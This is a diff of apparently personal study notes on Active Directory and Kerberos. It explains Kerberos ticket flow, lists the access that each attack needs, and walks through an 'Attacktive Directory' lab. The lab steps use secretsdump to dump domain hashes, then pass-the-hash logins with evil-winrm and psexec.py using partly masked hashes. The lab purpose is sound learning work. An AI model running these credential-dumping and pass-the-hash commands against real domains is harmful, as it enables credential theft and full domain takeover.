@@ -228,7 +228,71 @@ The best way to show you how the cloud takes security precautions past what is a
 
 This is only an overview of Active Directory in the cloud so we will not be going into detail of any of these protocols; however, I encourage you to go out and do your own research into these cloud protocols and how they are more secure than their physical counterparts, and if they themselves come with vulnerabilities
 
+## What is Kerberos? 
 
+Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.
+
+## Common Terminology 
+
+- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
+- Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
+- Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
+- Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
+- Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
+- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
+- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
+- Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
+- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
+- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
+
+## AS-REQ w/ Pre-Authentication In Detail 
+
+The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.
+
+## Ticket Granting Ticket Contents 
+
+In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.
+
+![image](https://user-images.githubusercontent.com/89842187/131717006-bbcdd5fc-1596-4717-ab90-2116df96c9c2.png)
+
+# Service Ticket Contents
+
+To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.
+
+- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
+- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.
+
+![image](https://user-images.githubusercontent.com/89842187/131717089-4e52ec02-b15a-42cf-9113-a4fba293988c.png)
+
+## Kerberos Authentication Overview
+
+![image](https://user-images.githubusercontent.com/89842187/131717117-30821c2e-29ac-4d43-a426-1cf5f26c30b4.png)
+
+- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
+
+- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
+
+- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
+
+- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
+
+- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
+
+- AP-REP - 6.) The service grants access
+
+## Kerberos Tickets Overview
+
+The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.
+
+## Attack Privilege Requirements
+
+- Kerbrute Enumeration - No domain access required 
+- Pass the Ticket - Access as a user to the domain required
+- Kerberoasting - Access as any user required
+- AS-REP Roasting - Access as any user required
+- Golden Ticket - Full domain compromise (domain admin) required 
+- Silver Ticket - Service hash required 
+- Skeleton Key - Full domain compromise (domain admin) required
 
 
 # Attacktive Directory
@@ -271,7 +335,7 @@ hashcat -m 18200 hash.txt passwordlist.txt --force
 ```
 
 
-# Enumeration:
+## Enumeration:
 
 With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.
 
@@ -279,3 +343,41 @@ With a user's account credentials we now have significantly more access within t
 smbclient -L example --user svc-admin
 smbclient \\\\spookysec.local\\backup --user svc-admin
 ```
+
+## Elevating Privileges within the Domain
+
+
+Let's Sync Up!
+
+Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?
+
+Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes
+
+Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.
+
+## Pass The Hash 
+```
+/opt/impacket/examples
+
+secretsdump.py -just-dc backup@domain.local # DUMP HASHES
+python3 secretsdump.py -just-dc backup@domain.local # DUMP Hashes
+
+
+https://github.com/Hackplayers/evil-winrm
+
+evil-winrm -i ip -u User -H e******************************b
+
+```
+
+## Login to admin with evil-winrm
+
+```
+evil-winrm -i ip -u user -H 0e0363213e37bXXXXX497260b0bcb4fc
+```
+
+## Login to admin with psexec.py
+
+```
+python3 psexec.py Administrator:@spookysec.local -hashes aad3b435b51404XXXXX3b435b51404ee:0e0363213e37bXXXXX497260b0bcb4fc
+```
+
